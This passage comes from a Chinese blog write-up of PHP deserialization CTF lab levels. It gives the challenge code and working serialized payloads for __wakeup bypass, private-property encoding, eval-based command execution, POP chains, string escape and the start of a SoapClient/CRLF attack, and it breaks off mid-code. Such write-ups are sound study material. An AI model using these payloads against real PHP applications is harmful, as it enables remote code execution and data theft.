<span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;action;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level5&quot;</span>&gt;点击进入第五关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>这里还用到一个php特性——Array</p><p>当array内包裹的第一个值是对象，第二个是对象内的方法时</p><p>在反序列化后会调用该对象的方法</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423182048184.png" alt="image-20240423182048184"></p><p>所以就可以利用这个特性调用到getflag这个方法，至于如何读取到flag就要用到前面说的create_fucntion,但不懂为什么不会弹回flag，应该是版本问题</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a><strong>level5</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level6&quot;</span>&gt;点击进入第六关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>wakeup绕过，正则表达式绕过</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>());</span><br><span class="line"><span class="comment">#O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">#绕过正则，在6前面添个+号，绕过wakeup，把1改成2，成员数量不一致即可</span></span><br><span class="line"><span class="comment">#修改后：O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423224017009.png" alt="image-20240423224017009"></p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;daydream&quot;</span>,<span class="variable">$param</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level7&quot;</span>&gt;点击进入第七关&lt;/a&gt;s</span><br></pre></td></tr></table></figure><p> 本关对输入的param进行了一个%的过滤，而且类中的属性的变量是私有属性</p><p><strong>private属性序列化的时候格式是 %00类名%00成员名</strong></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>(<span class="string">&quot;system(&#x27;sort flag.php&#x27;);&quot;</span>);</span><br><span class="line"><span class="comment">#O:6:&quot;secret&quot;:1:&#123;s:12:&quot;%00secret%00comm&quot;;s:24:&quot;system(&#x27;sort flag.php&#x27;);&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pa</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>但还是不行， 这里因为%00被url解码后是不可见字符，所以要在类名左右加上\00且要将上面的小写s改成S</p><p><strong>与小写”s”不同，大写”S”表示键名或属性名是区分大小写的。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#O:6:&quot;secret&quot;:1:&#123;S:12:&quot;\00secret\00comm&quot;;s:24:&quot;system(&#x27;sort flag.php&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423230938596.png" alt="image-20240423230938596"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)#反序列化时调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$project</span>=<span class="variable language_">$this</span>-&gt;pro;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body-&gt;<span class="variable">$projecct</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)//调用不存在方法的时候，</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func</span> == <span class="string">&#x27;yourname&#x27;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;myname&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>当调用不存在的方法时，会把不存在的方法名赋值给第一个参数，所以不存在的方法最好就是yourname,所以pro可以设置成yourname，而要调用不存在的方法，可以new一个my赋值给body，所以构造出来的代码是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span> = <span class="keyword">new</span> <span class="title function_ invoke__">my</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>=<span class="string">&#x27;yourname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;myname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">you</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#$a=$_GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但这样运行会报错，PHP不允许在类属性的声明中使用直接实例化的方式。</p><p>类属性的初始化必须使用常量或静态表达式，而不能使用函数调用或实例化操作。因此，将$body属性的初始化移动到类的构造函数中会解决这个问题。比如在serialize时会调用的construct方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span> = <span class="string">&#x27;yourname&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body = <span class="keyword">new</span> <span class="title function_ invoke__">my</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;myname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">you</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//然后记得将私有属性的%00补上</span></span><br><span class="line"><span class="comment">//O:3:&quot;you&quot;:2:&#123;s:9:&quot;%00you%00body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;s:8:&quot;%00you%00pro&quot;;s:8:&quot;yourname&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240424202419211.png" alt="image-20240424202419211"></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>字符串逃逸，重要的是让filter里的name&#x3D;&#x3D;escaping，test不用考虑，下面来看看要几个php把,先把需要的序列化字符串构造出来</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;123&quot;</span>;<span class="comment">#这个随便打</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;escaping&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:3:&quot;123&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>关键是要**s:4:”pass”;s:8:”escaping”;}**这一段，这时就要让吐出来的字符数为29个，加上前面的引号和冒号,而1个php转换成hack会吃掉一个字符，所以全部要29个php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$user=&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>最终代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;escaping&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="comment">#O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240424204156850.png" alt="image-20240424204156850"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a><strong>level9</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这个是格式方法错误导致被调用。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="comment">//即把对象当成字符串 调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//unserialize() 会检查是否存在一个wakeup()方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="comment">//序列化时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用的成员属性不存在</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先，要想页面返回flag，我们就要调用append方法，而append方法时通过invoke方法赋值，而invoke是通过错误格式方法来触发，这就要找能调用方法的地方，可以找到get，而能触发get的方法就要找到可以读取属性的地方，即toString，而触发toString的地方只有Show，所以show就是头</p><p>构造poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#先从头开始</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();                                             <span class="variable">$a</span>-&gt;source = <span class="variable">$a</span>;<span class="comment">//把对象当字符串调用</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="variable">$b</span>;<span class="comment">//source类中的str赋值为Test类,当调用该类中不存在的属性source时触发get</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;p=<span class="variable">$c</span>;<span class="comment">//把类赋值给方法触发invoke</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//从头开始序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240424212028638.png" alt="image-20240424212028638"></p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>本关需要开启soap拓展且php版本在5.6、找到配置文件 php-ini</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240424214011774.png" alt="image-20240424214011774"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="variable">$c</span> -&gt; <span class="title function_ invoke__">daydream</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.</span></span><br><span class="line"><span class="comment">flag.php</span></span><br><span class="line"><span class="comment">$flag=&quot;*&quot;;</span></span><br><span class="line"><span class="comment">$user=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span></span><br><span class="line"><span class="comment">$pass = $_POST[&#x27;pass&#x27;];</span></span><br><span class="line"><span class="comment">if(isset($pass) and isset($user))&#123;</span></span><br><span class="line"><span class="comment">    if($pass==&#x27;password&#x27; and $user==&#x27;admin&#x27;)&#123;</span></span><br><span class="line"><span class="comment">        file_put_contents(&#x27;flag.txt&#x27;,$flag);</span></span><br><span class="line"><span class="comment">    &#125;    </span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前置知识;<a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p><p>在给出的代码中，有一个名为flag.php的文件。这个文件的作用是根据一些条件将一个标志($flag)写入到flag.txt文件中。</p><p>下面是对代码的解释：</p><ol><li><p>首先，定义了一个变量$flag，其初始值为”*”，表示标志的内容。</p></li><li><p>接下来，通过$_SERVER[‘HTTP_USER_AGENT’]获取了用户的User-Agent信息，并将其赋值给变量$user。</p></li><li><p>然后，通过$_POST[‘pass’]获取了来自POST请求的pass参数的值，并将其赋值给变量$pass。</p></li><li><p>在if条件语句中，首先使用isset()函数检查$pass和$user是否都存在。</p></li><li><p>如果$pass的值等于”password”并且$user的值等于”admin”，则条件成立。</p></li><li><p>在条件成立的情况下，使用file_put_contents()函数将$flag的内容写入到名为flag.txt的文件中。</p></li></ol><p>综上所述，这段代码的逻辑是，当接收到POST请求中包含正确的密码(“password”)和用户代理信息(“admin”)时，将标志($flag)的内容写入到flag.txt文件中。这可以作为一个简单的身份验证和授权机制，只有在满足特定条件时才会写入标志文件。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240424212652149.png" alt="image-20240424212652149"></p><p>在后台返回一下falg.php的一些值看看，在从0-1看到了类似的题目,原生类的利用public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<br>第一个参数是用来指明是否是wsdl模式，如果为<code>null</code>，那就是非wsdl模式。<br>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 </p><p> 还要利用crlf注入漏洞(\r\n)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$post_data</span>=<span 